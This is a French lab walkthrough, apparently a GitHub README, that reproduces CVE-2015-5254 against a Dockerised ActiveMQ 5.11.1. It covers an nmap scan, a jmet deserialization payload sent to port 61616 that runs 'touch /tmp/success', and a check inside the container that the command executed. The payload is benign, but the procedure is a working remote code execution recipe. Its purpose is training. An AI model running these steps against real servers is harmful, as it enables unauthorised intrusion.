# Exploitation de CVE-2015-5254

Ce document explique les étapes nécessaires pour exploiter la vulnérabilité **CVE-2015-5254** sur un serveur ActiveMQ. Il inclut la configuration de l'environnement, l'exploitation de la faille et la vérification des résultats.

---

## **1. Configuration de l'environnement ActiveMQ**

### Lancer ActiveMQ avec Docker
1. Positionnez-vous dans le dossier `activemq_2015`.
2. Lancez ActiveMQ en arrière-plan avec la commande :
   ```bash
   docker compose up -d
   ```
3. Accédez à l'interface d'administration ActiveMQ dans un navigateur :
   ```
   http://localhost:8161/admin/
   ```

   Vous devriez voir la version d'ActiveMQ (exemple : 5.11.1).

![Interface ActiveMQ](https://github.com/user-attachments/assets/fd58667a-cb77-4458-8bd6-a0f323f03e1c)

### Vérifier la version d'ActiveMQ
- La version peut également être confirmée dans le fichier `docker-compose.yml`.

![Version dans docker-compose.yml](https://github.com/user-attachments/assets/125fbdbd-77fb-46a0-8c8a-acebcf745bd7)

---

## **2. Identifier les services actifs**

Utilisez `nmap` pour scanner le réseau et vérifier que le port 61616 est ouvert :
```bash
nmap -p- 192.168.1.145
```

![Résultats de nmap](https://github.com/user-attachments/assets/f3f1a525-1337-4b49-8ab3-7ec538eec2e2)

---

## **3. Préparer la charge utile**

1. Créez un dossier appelé `external` pour y stocker le fichier malveillant :
   ```bash
   mkdir external
   ```

   ![Création du dossier external](https://github.com/user-attachments/assets/30b6afcf-3642-4be8-9c88-c4ad88f9852a)

2. Téléchargez l'outil **jmet-0.1.0-all.jar** depuis le lien suivant :
   [Télécharger JMet](https://github.com/matthiaskaiser/jmet/releases).
3. Placez le fichier téléchargé dans le dossier `activemq_2015`.

---

## **4. Exploiter la vulnérabilité**

1. Exécutez la commande suivante pour envoyer une charge utile à ActiveMQ :
   ```bash
   java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/success" -Yp ROME 192.168.1.145 61616
   ```

   - Cette commande crée un fichier nommé `success` dans le répertoire `/tmp` du conteneur ActiveMQ.

![Envoi de la charge](https://github.com/user-attachments/assets/1cf96446-9765-4ba1-ba47-430dd2d12fdd)

2. Vérifiez l’injection en consultant l’onglet **Queues** de l’interface d’administration ActiveMQ.
   - Vous devriez voir le message injecté dans la file d’attente.

![Message injecté](https://github.com/user-attachments/assets/2f1d85a9-0f23-4b35-8fd2-8c11541d8120)

---

## **5. Vérification du succès de l’injection**

1. Listez les conteneurs en cours d'exécution pour obtenir l'ID du conteneur ActiveMQ :
   ```bash
   docker ps -a
   ```

   ![Liste des conteneurs](https://github.com/user-attachments/assets/a31e82c3-a845-4af4-ac48-abe4ee5e2024)

2. Accédez au conteneur ActiveMQ avec la commande suivante :
   ```bash
   docker exec -it <ID_du_conteneur> /bin/bash
   ```
   - Remplacez `<ID_du_conteneur>` par l'ID récupéré précédemment.

![Accès au conteneur](https://github.com/user-attachments/assets/a1449b45-b334-47a7-83fb-da2ba883e82b)

3. Rendez-vous dans le répertoire `/tmp` et vérifiez la présence du fichier `success` :
   ```bash
   ls /tmp
   ```

![Vérification du fichier success](https://github.com/user-attachments/assets/65d0490b-26b4-4f6e-aabb-4f77f0901cb0)

   - La présence du fichier indique que la commande a été exécutée avec succès.

---

